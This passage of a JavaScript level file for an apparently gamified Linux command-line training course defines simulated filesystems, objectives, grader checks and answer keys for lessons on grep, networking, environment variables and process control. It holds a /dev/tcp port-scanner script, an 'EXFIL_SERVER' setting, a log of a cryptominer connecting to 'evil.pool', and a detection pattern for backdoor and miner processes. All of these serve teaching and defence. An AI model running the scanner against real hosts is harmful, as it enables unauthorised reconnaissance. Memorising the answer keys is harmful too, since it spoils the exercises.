                    group: 'operator',
                    size: 567,
                    content: `[ERROR] 10:15:45 - SQL injection attempt detected from 10.0.0.88
[WARNING] 10:16:22 - Multiple failed auth attempts from 10.0.0.88
[ERROR] 10:17:45 - Brute force pattern detected from 10.0.0.88
[INFO] 10:18:12 - Rate limiting enabled for 10.0.0.88
[ERROR] 10:19:33 - Path traversal attempt blocked from 10.0.0.88
[CRITICAL] 10:20:15 - Attack signature matched: directory traversal`
                },
                '/home/operator/reports': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['README.txt']
                },
                '/home/operator/reports/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 89,
                    content: `Grep Output Directory
Save your search results here using redirection:
grep -i "error" logs/system.log > reports/errors.txt`
                },
                '/home/operator/data': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['suspicious_ips.txt', 'known_attackers.txt']
                },
                '/home/operator/data/suspicious_ips.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 156,
                    content: `10.0.0.88 - Flagged for investigation
10.0.0.99 - Known scanner
172.16.100.5 - Suspicious activity
192.168.50.123 - Under review`
                },
                '/home/operator/data/known_attackers.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 234,
                    content: `# Known malicious IPs - DO NOT WHITELIST
10.0.0.88 - Active attacker (brute force, SQL injection, path traversal)
185.220.101.1 - Tor exit node
45.33.32.156 - Botnet C2
198.51.100.23 - DDoS source`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 245,
                    content: `ls -la logs/
cat logs/auth.log | head
grep "FAILED" logs/auth.log
grep -i error logs/system.log
grep -v success logs/auth.log
grep -c FAILED logs/auth.log
grep -n 192.168 logs/network.log`
                },
                '/home/operator/.grep_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 456,
                    content: `GREP QUICK REFERENCE
====================
-i  Case insensitive
-v  Invert match (exclude)
-c  Count matches only
-n  Show line numbers
-r  Recursive search
-E  Extended regex (egrep)
-o  Only show matched part
-l  List files with matches
-A3 Show 3 lines after match
-B3 Show 3 lines before match
-C3 Show 3 lines context

REGEX BASICS:
.     Any single character
*     Zero or more of previous
+     One or more (use -E)
^     Start of line
$     End of line
[abc] Character class
[0-9] Digit range`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'HUNT: Case-Insensitive Search',
                    hint: 'Find "error" (any case): grep -i "error" logs/system.log',
                    check: (cmd, state, output) => cmd.includes('grep') && cmd.includes('-i') &&
                               cmd.toLowerCase().includes('error') &&
                               output && !output.startsWith('grep:') && output.length > 0
                },
                {
                    id: 2,
                    task: 'EXCLUDE: Invert the Match',
                    hint: 'Show non-success lines: grep -v "success" logs/auth.log',
                    check: (cmd, state, output) => cmd.includes('grep') && cmd.includes('-v') &&
                               output && !output.startsWith('grep:') && output.includes('FAILED')
                },
                {
                    id: 3,
                    task: 'COUNT: Quantify the Threat',
                    hint: 'Count FAILED logins: grep -c "FAILED" logs/auth.log',
                    check: (cmd, state, output) => cmd.includes('grep') && cmd.includes('-c') &&
                               output && /^\d+$/.test(output.trim()) && parseInt(output.trim()) > 0
                },
                {
                    id: 4,
                    task: 'LOCATE: Show Line Numbers',
                    hint: 'Show with line numbers: grep -n "192.168" logs/network.log',
                    check: (cmd, state, output) => cmd.includes('grep') && cmd.includes('-n') &&
                               output && /^\d+:/.test(output.trim())
                },
                {
                    id: 5,
                    task: 'REGEX: Match IP Pattern',
                    hint: 'Use regex: grep -E "[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+" logs/network.log',
                    check: (cmd, state, output) => ((cmd.includes('grep') && cmd.includes('-E')) ||
                               cmd.includes('egrep')) && output && !output.startsWith('grep:') &&
                               /\d+\.\d+\.\d+\.\d+/.test(output)
                },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "How many failed login attempts were recorded in auth.log?",
                hint: "Use grep -c to count lines matching 'FAILED' in the auth log.",
                hintAfterAttempts: 3,
                acceptedAnswers: ['6', 'six'],
                correctAnswerMessage: 'Intel confirmed. Six failed login attempts cataloged — brute force pattern verified.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-012: Network Basics
        // Theme: Network reconnaissance commands
        // ──────────────────────────────────────────────────────────
        'CLH-012': {
            title: 'Network Basics',
            description: 'Master ping, netstat, ss, and ip commands for network reconnaissance.',
            prerequisites: ['CLH-011'],
            tier: 'CLI Shadow',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['intel', 'logs', 'reports', 'scripts', '.bash_history', '.network_cheatsheet']
                },
                '/home/operator/intel': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['targets.txt', 'scan_results.txt', 'network_map.txt', 'services.txt']
                },
                '/home/operator/intel/targets.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 245,
                    content: `# Target Network - Shadow Operations
10.0.0.5 - Primary server (CRITICAL)
10.0.0.10 - Database server
10.0.0.15 - Web server
10.0.0.20 - File server
192.168.1.1 - Gateway/Router
192.168.1.105 - Analyst workstation
172.16.0.1 - DMZ gateway`
                },
                '/home/operator/intel/scan_results.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 234,
                    content: `Port scan results for 10.0.0.5:
22/tcp open ssh OpenSSH 8.2
80/tcp open http Apache 2.4.41
443/tcp open https Apache 2.4.41
3306/tcp open mysql MySQL 8.0.23
8080/tcp filtered http-proxy`
                },
                '/home/operator/intel/network_map.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 345,
                    content: `NETWORK TOPOLOGY
================
                    [Internet]
                        |
                  [192.168.1.1]  <-- Gateway
                        |
        +---------------+---------------+
        |               |               |
   [10.0.0.5]      [10.0.0.10]    [10.0.0.15]
   Primary         Database        Web
   Server          Server          Server`
                },
                '/home/operator/intel/services.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 189,
                    content: `Running Services Detected:
- SSH (22): Remote administration
- HTTP (80): Web application
- HTTPS (443): Secure web
- MySQL (3306): Database backend
- Monitoring agent on 10.0.0.5:9100`
                },
                '/home/operator/logs': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['connections.log', 'ping.log']
                },
                '/home/operator/logs/connections.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 312,
                    content: `2024-01-15 10:15:32 ESTABLISHED 192.168.1.105:44821 -> 10.0.0.5:443
2024-01-15 10:15:45 ESTABLISHED 192.168.1.42:55123 -> 10.0.0.5:80
2024-01-15 10:16:01 TIME_WAIT 10.0.0.88:53421 -> 10.0.0.5:3306
2024-01-15 10:16:22 ESTABLISHED 172.16.0.23:61234 -> 10.0.0.5:22
2024-01-15 10:17:03 SYN_SENT 10.0.0.88:55555 -> 10.0.0.5:445`
                },
                '/home/operator/logs/ping.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 234,
                    content: `Connectivity check - 2024-01-15
10.0.0.5: 64 bytes, time=0.5ms - UP
10.0.0.10: 64 bytes, time=0.8ms - UP
10.0.0.15: 64 bytes, time=1.2ms - UP
192.168.1.1: 64 bytes, time=0.3ms - UP
172.16.0.1: Request timeout - DOWN`
                },
                '/home/operator/reports': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['README.txt']
                },
                '/home/operator/reports/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 78,
                    content: `Network Recon Reports
Save your findings here:
netstat -tuln > reports/ports.txt`
                },
                '/home/operator/scripts': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['netcheck.sh', 'portscan.sh']
                },
                '/home/operator/scripts/netcheck.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `#!/bin/bash
# Network connectivity checker
echo "=== NETWORK STATUS ==="
ip addr | grep inet
echo "=== GATEWAY ==="
ip route | grep default
echo "=== DNS ==="
cat /etc/resolv.conf 2>/dev/null`
                },
                '/home/operator/scripts/portscan.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 189,
                    content: `#!/bin/bash
# Quick port scanner
TARGET=\${1:-10.0.0.5}
echo "Scanning $TARGET..."
for port in 22 80 443 3306 8080; do
  timeout 1 bash -c "echo >/dev/tcp/$TARGET/$port" 2>/dev/null && echo "$port open"
done`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 178,
                    content: `cat intel/targets.txt
ping 10.0.0.5
netstat -tuln
ss -tp
ip addr
ip route
cat intel/scan_results.txt`
                },
                '/home/operator/.network_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 456,
                    content: `NETWORK RECON CHEATSHEET
========================
CONNECTIVITY:
  ping <ip>           Test if host is up
  ping -c 4 <ip>      Send only 4 packets

LISTENING PORTS:
  netstat -tuln       TCP/UDP listening ports
  ss -tuln            Modern alternative to netstat

CONNECTIONS:
  netstat -tp         TCP connections with PIDs
  ss -tp              Socket stats with processes

IP CONFIGURATION:
  ip addr             Show all IP addresses
  ip a                Short form
  ifconfig            Legacy command

ROUTING:
  ip route            Show routing table
  route -n            Legacy routing table`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'RECON: Check Host Connectivity',
                    hint: 'Test connectivity: ping 10.0.0.5',
                    check: (cmd, state, output) => cmd.includes('ping') &&
                               output && (output.includes('bytes from') || output.includes('PING'))
                },
                {
                    id: 2,
                    task: 'SCAN: List Listening Ports',
                    hint: 'Show listening ports: netstat -tuln',
                    check: (cmd, state, output) => (cmd.includes('netstat') || cmd.includes('ss')) &&
                               output && (output.includes('LISTEN') || output.includes('Local Address'))
                },
                {
                    id: 3,
                    task: 'ANALYZE: Socket Statistics',
                    hint: 'Show connections: ss -tp',
                    check: (cmd, state, output) => cmd.includes('ss') &&
                               output && (output.includes('ESTAB') || output.includes('State'))
                },
                {
                    id: 4,
                    task: 'IDENTIFY: Show IP Configuration',
                    hint: 'Display IPs: ip addr',
                    check: (cmd, state, output) => (cmd.includes('ip') && (cmd.includes('addr') || cmd.includes(' a '))) &&
                               output && (output.includes('inet') || output.includes('192.168'))
                },
                {
                    id: 5,
                    task: 'MAP: View Routing Table',
                    hint: 'Show routes: ip route',
                    check: (cmd, state, output) => cmd.includes('ip') && cmd.includes('route') &&
                               output && (output.includes('default') || output.includes('via'))
                },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "Based on the scan results, what database port is open on the target?",
                hint: "Check the scan_results.txt file in the intel directory.",
                hintAfterAttempts: 3,
                acceptedAnswers: ['3306', 'port 3306', 'mysql 3306'],
                correctAnswerMessage: 'Intel confirmed. MySQL on port 3306 — potential attack vector identified.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-013: Environment Variables
        // Theme: Shell environment manipulation
        // ──────────────────────────────────────────────────────────
        'CLH-013': {
            title: 'Environment Variables',
            description: 'Understand and manipulate shell environment variables.',
            prerequisites: ['CLH-012'],
            tier: 'CLI Shadow',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['.bashrc', '.profile', '.bash_history', '.env_cheatsheet', 'scripts', 'config', 'logs', 'intel', 'reports']
                },
                '/home/operator/.bashrc': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 234,
                    content: `# Operator shell config
export PS1="\\u@\\h:\\w$ "
alias ll="ls -la"
alias grep="grep --color=auto"
export EDITOR=vim
export HISTSIZE=10000
# Custom tools path
export TOOLS=/opt/shadow-tools`
                },
                '/home/operator/.profile': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 178,
                    content: `# Profile settings - loaded at login
export PATH=$PATH:$HOME/bin
export LANG=en_US.UTF-8

# Mission-specific settings
export LOG_LEVEL=debug
export OPERATION_MODE=stealth`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 145,
                    content: `env
echo $PATH
echo $HOME
export MISSION=active
export PATH=$PATH:/opt/shadow-tools
cat .bashrc
printenv | grep PATH`
                },
                '/home/operator/.env_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 456,
                    content: `ENVIRONMENT VARIABLES CHEATSHEET
=================================
VIEWING:
  env                  Show all variables
  printenv             Same as env
  echo $VAR            Show specific variable
  printenv VAR         Show specific (no $)

SETTING:
  VAR=value            Set for current command only
  export VAR=value     Set for current session
  unset VAR            Remove variable

IMPORTANT VARIABLES:
  PATH     Search path for commands
  HOME     User's home directory
  USER     Current username
  SHELL    Current shell
  PWD      Current directory
  EDITOR   Default text editor
  LANG     Language/locale

PERSISTENCE:
  ~/.bashrc   Loaded on each new shell
  ~/.profile  Loaded at login only`
                },
                '/home/operator/scripts': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['setup_env.sh']
                },
                '/home/operator/scripts/setup_env.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 234,
                    content: `#!/bin/bash
# Setup mission environment
export MISSION=active
export TARGET_IP=10.0.0.5
export LOG_DIR=/var/log/ops
export PATH=$PATH:/opt/shadow-tools

echo "Environment configured for operation"
env | grep -E "(MISSION|TARGET|LOG_DIR)"`
                },
                '/home/operator/config': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['mission.env']
                },
                '/home/operator/config/mission.env': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 189,
                    content: `# Mission configuration - source this file
# Usage: source config/mission.env

export OPERATION_NAME="Shadow Strike"
export TARGET_NETWORK="10.0.0.0/24"
export EXFIL_SERVER="192.168.100.1"
export ENCRYPTION_KEY="[CLASSIFIED]"`
                },
                // === LOGS DIRECTORY ===
                '/home/operator/logs': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['env.log', 'session.log']
                },
                '/home/operator/logs/env.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 312,
                    content: `[2024-01-15 08:00] Environment initialized
[2024-01-15 08:01] PATH extended: /opt/shadow-tools
[2024-01-15 08:02] MISSION variable set: active
[2024-01-15 08:05] Source: config/mission.env loaded
[2024-01-15 08:10] OPERATION_NAME: Shadow Strike
[2024-01-15 08:15] Session ready for operation`
                },
                '/home/operator/logs/session.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 245,
                    content: `Session: operator@shadow
Started: 2024-01-15 07:55:00
Shell: /bin/bash
Term: xterm-256color
Environment loaded from: ~/.bashrc, ~/.profile
Custom tools: /opt/shadow-tools`
                },
                // === INTEL DIRECTORY ===
                '/home/operator/intel': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['briefing.txt', 'variables.md']
                },
                '/home/operator/intel/briefing.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 356,
                    content: `=== MISSION BRIEFING ===
OPERATION: Shadow Strike
STATUS: Active

Environment variables control mission parameters.
Configure the following before operation:
- MISSION: Set to 'active' when ready
- PATH: Must include /opt/shadow-tools
- TARGET_IP: Primary objective

Review .bashrc for persistent configuration.
Run 'env' to verify all variables are set.`
                },
                '/home/operator/intel/variables.md': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 420,
                    content: `# Critical Variables Reference

| Variable | Purpose | Value |
|----------|---------|-------|
| MISSION | Operation status | active |
| TARGET_IP | Primary target | 10.0.0.5 |
| EXFIL_SERVER | Data extraction | 192.168.100.1 |
| LOG_DIR | Operation logs | /var/log/ops |

## Notes
- Always verify PATH includes shadow-tools
- Source mission.env before operation
- Check env output matches expected config`
                },
                // === REPORTS DIRECTORY ===
                '/home/operator/reports': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['README.txt']
                },
                '/home/operator/reports/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 189,
                    content: `# Reports Directory

Save environment audits here:
  env > reports/env_dump.txt
  printenv | sort > reports/sorted_vars.txt
  echo $PATH > reports/path.txt

Use for mission verification before operations.`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'SURVEY: List All Variables',
                    hint: 'Display all: env',
                    check: (cmd, state, output) => (cmd.includes('env') || cmd.includes('printenv')) &&
                               output && (output.includes('PATH') || output.includes('HOME'))
                },
                {
                    id: 2,
                    task: 'INSPECT: Check Your PATH',
                    hint: 'Show PATH: echo $PATH',
                    check: (cmd, state, output) => cmd.includes('echo') && cmd.includes('PATH') &&
                               output && (output.includes('/usr') || output.includes('/bin'))
                },
                {
                    id: 3,
                    task: 'IDENTIFY: Find Your Home',
                    hint: 'Show HOME: echo $HOME',
                    check: (cmd, state, output) => cmd.includes('echo') && cmd.includes('HOME') &&
                               output && output.includes('/home')
                },
                {
                    id: 4,
                    task: 'CREATE: Set Mission Variable',
                    hint: 'Create variable: export MISSION=active',
                    check: (cmd, state, output) => cmd.includes('export') && cmd.includes('MISSION')
                },
                {
                    id: 5,
                    task: 'EXTEND: Add Tools to PATH',
                    hint: 'Extend PATH: export PATH=$PATH:/opt/shadow-tools',
                    check: (cmd, state, output) => cmd.includes('export') && cmd.includes('PATH') && cmd.includes('/opt')
                },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "What alias is defined in the operator's .bashrc file?",
                hint: "Read the .bashrc file to see what shortcuts are configured.",
                hintAfterAttempts: 3,
                acceptedAnswers: ['ll', 'alias ll', 'll="ls -la"', 'ls -la'],
                correctAnswerMessage: 'Intel confirmed. Alias ll mapped to ls -la — operator shortcuts cataloged.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-014: Process Control
        // Theme: Process management and termination
        // ──────────────────────────────────────────────────────────
        'CLH-014': {
            title: 'Process Control',
            description: 'Manage and terminate processes. Master kill, jobs, bg, fg, and nohup.',
            prerequisites: ['CLH-013'],
            tier: 'CLI Phantom',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['monitor.sh', 'intel', 'scripts', 'logs', '.bash_history', '.process_cheatsheet']
                },
                '/home/operator/monitor.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 98,
                    content: `#!/bin/bash
# Continuous monitoring script
# Run with: nohup ./monitor.sh &
while true; do
  date >> /tmp/monitor.log
  ps aux >> /tmp/process_snapshot.log
  sleep 60
done`
                },
                '/home/operator/intel': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['processes.txt', 'incident_report.txt', 'kill_targets.txt']
                },
                '/home/operator/intel/processes.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `Known malicious processes:

CRYPTOMINERS:
- rogue_agent (cryptominer) - PID typically 6666
  Uses high CPU, connects to mining pools

BACKDOORS:
- backdoor_shell (reverse shell)
- keylogger_x (keylogger)

Action: Terminate with kill -9 if SIGTERM fails.`
                },
                '/home/operator/intel/incident_report.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 312,
                    content: `INCIDENT REPORT - IR-2026-0147
=============================
Date: 2026-01-19
Severity: HIGH

Anomaly detected on production server.
CPU usage spiked to 98% at 09:15.

Initial analysis suggests cryptominer activity.
Process running as 'nobody' user - possible privilege escalation.

REQUIRED ACTIONS:
1. Identify rogue process (ps aux | grep)
2. Terminate the process (kill PID)
3. Establish persistent monitoring (nohup)`
                },
                '/home/operator/intel/kill_targets.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: `APPROVED FOR TERMINATION
========================
PID: 6666 - rogue_agent (cryptominer)

DO NOT KILL:
- PID 1 (init)
- PID 345 (sshd)
- PID 456 (cron)
- PID 789 (nginx)`
                },
                '/home/operator/scripts': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['cleanup.sh', 'watchdog.sh']
                },
                '/home/operator/scripts/cleanup.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 145,
                    content: `#!/bin/bash
# Cleanup script - terminates known bad processes
killall rogue_agent 2>/dev/null
killall backdoor_shell 2>/dev/null
echo "Cleanup complete"`
                },
                '/home/operator/scripts/watchdog.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 178,
                    content: `#!/bin/bash
# Watchdog - monitor for suspicious processes
# Run with: nohup ./scripts/watchdog.sh &
while true; do
  pgrep -f "rogue|backdoor|miner" && echo "ALERT: Threat detected!"
  sleep 30
done`
                },
                '/home/operator/logs': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['process_history.log', 'alerts.log']
                },
                '/home/operator/logs/process_history.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 478,
                    content: `[2026-01-19 08:00:01] System boot complete
[2026-01-19 08:00:12] sshd started (PID 345)
[2026-01-19 08:00:15] cron started (PID 456)
[2026-01-19 08:00:18] nginx started (PID 789)
[2026-01-19 09:15:33] ALERT: Unknown process spawned
[2026-01-19 09:15:33] Process: rogue_agent (PID 6666)
[2026-01-19 09:15:34] User: nobody (unexpected!)
[2026-01-19 09:15:35] CPU: 98.5% (CRITICAL)
[2026-01-19 09:15:36] Network: Outbound connection to evil.pool:3333`
                },
                '/home/operator/logs/alerts.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `SECURITY ALERT LOG
==================
[09:15:35] HIGH: Cryptominer detected - rogue_agent PID 6666
[09:15:36] HIGH: Unauthorized mining pool connection
[09:16:01] MEDIUM: Process consuming excessive CPU
[09:20:00] INFO: Awaiting operator intervention`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 89,
                    content: `ps aux
ps aux | grep rogue
kill 6666
jobs
nohup ./monitor.sh &`
                },
                '/home/operator/.process_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 856,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║           PROCESS CONTROL CHEATSHEET                          ║
╚═══════════════════════════════════════════════════════════════╝

VIEWING PROCESSES
─────────────────
ps aux              All processes, BSD style
ps -ef              All processes, System V style
top                 Real-time process monitor
pgrep <name>        Find PID by name

TERMINATING PROCESSES
────────────────────
kill <PID>          Send SIGTERM (graceful shutdown)
kill -9 <PID>       Send SIGKILL (force kill)
killall <name>      Kill all processes by name
pkill <pattern>     Kill by pattern match

SIGNALS
───────
SIGTERM (15)        Request termination (default)
SIGKILL (9)         Force kill (cannot be caught)
SIGSTOP (19)        Pause process
SIGCONT (18)        Resume process
SIGHUP (1)          Hangup - used to reload config

JOB CONTROL
───────────
command &           Run in background
jobs                List background jobs
fg %<n>             Bring job to foreground
bg %<n>             Continue job in background
Ctrl+Z              Suspend current job

PERSISTENT PROCESSES
───────────────────
nohup cmd &         Run immune to hangups
disown              Remove job from shell
screen              Terminal multiplexer
tmux                Modern terminal multiplexer`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'SURVEY: List Running Processes',
                    hint: 'Show all processes: ps aux',
                    check: (cmd, state, output) => cmd.includes('ps') &&
                        (cmd.includes('aux') || cmd.includes('-ef') || cmd.includes('-e')) &&
                        output && (output.includes('PID') || output.includes('COMMAND'))
                },
                {
                    id: 2,
                    task: 'HUNT: Find Suspicious Process',
                    hint: 'Filter processes: ps aux | grep rogue',
                    check: (cmd, state, output) => cmd.includes('ps') && cmd.includes('grep') &&
                        output && (output.includes('rogue') || output.includes('6666'))
                },
                {
                    id: 3,
                    task: 'TERMINATE: Kill by PID',
                    hint: 'Kill process: kill 6666',
                    check: (cmd, state, output) => cmd.includes('kill') && cmd.includes('6666') &&
                        output && output.includes('Terminated')
                },
                {
                    id: 4,
                    task: 'MANAGE: View Background Jobs',
                    hint: 'List jobs: jobs',
                    check: (cmd, state) => cmd.trim() === 'jobs'
                },
                {
                    id: 5,
                    task: 'PERSIST: Run Immune to Hangup',
                    hint: 'Run persistent: nohup ./monitor.sh &',
                    check: (cmd, state, output) => cmd.includes('nohup') &&
                        output && output.includes('nohup.out')
                },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "According to intel, what is the name of the cryptominer process?",
                hint: "Check the processes.txt file in the intel directory for known threats.",
                hintAfterAttempts: 3,
                acceptedAnswers: ['rogue_agent', 'rogue agent', 'rogueagent'],
                correctAnswerMessage: 'Intel confirmed. Process rogue_agent identified as cryptominer — target acquired.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-015: OPERATION MOLE HUNT (Midterm)
        // Theme: Identify the traitor through data correlation
        // ──────────────────────────────────────────────────────────
        'CLH-015': {
            title: 'OPERATION MOLE HUNT',
            description: 'Midterm Mission: Intelligence indicates a traitor among our operators. Cross-reference personnel files to identify the mole.',
            prerequisites: ['CLH-014'],
            tier: 'CLI Phantom',
            user: 'analyst',
            hostname: 'COUNTER-INTEL',
            startDir: '/home/analyst',
            allowedCommands: null,

            filesystem: {
                // Override root to include /evidence and /tmp in children
                '/': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'root',
                    group: 'root',
                    children: ['home', 'etc', 'var', 'tmp', 'usr', 'bin', 'sbin', 'opt', 'root', 'evidence']
                },
                '/home/analyst': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'analyst',
                    group: 'analyst',
                    children: ['mission_brief.txt', 'workspace', 'evidence', '.bash_history', '.molehunt_cheatsheet']
                },
                '/home/analyst/evidence': {
                    type: 'symlink',
                    perms: 'lrwxrwxrwx',
                    owner: 'analyst',
                    group: 'analyst',
                    target: '/evidence'
                },
                '/home/analyst/mission_brief.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'analyst',
                    group: 'analyst',
                    size: 1024,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║         OPERATION MOLE HUNT - CLASSIFIED BRIEFING             ║
╚═══════════════════════════════════════════════════════════════╝

SITUATION:
Intelligence confirms a TRAITOR among our field operators.
Multiple operations have been compromised. We have a mole.

YOUR MISSION:
Cross-reference personnel databases to identify the traitor.
Evidence has been collected in /evidence directory.

INTELLIGENCE CONSTRAINTS (read /evidence/intel/constraints.txt):
The traitor matches ALL of the following criteria:
  1. Was assigned to an operation that is now INACTIVE
  2. Has ZONE-ALPHA security clearance
  3. Their compromised operation was in SECTOR-7
  4. Is NOT currently assigned to any ACTIVE operation

PROCESS:
  1. Study the constraints carefully
  2. Cross-reference the personnel and operations files
  3. Use grep and pipes to filter data
  4. Narrow down to exactly 3 SUSPECTS
  5. Find the SMOKING GUN to identify the actual traitor

REPORT FORMAT: SUSPECT1,SUSPECT2,SUSPECT3:TRAITOR
(Suspects in alphabetical order)

WARNING: The mole is aware they're being hunted. Work fast.
"Trust no one. Verify everything."`
                },
                '/home/analyst/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'analyst',
                    group: 'analyst',
                    size: 384,
                    content: `cd /evidence
ls -la
cat intel/constraints.txt
cat personnel/operators.txt | head -20
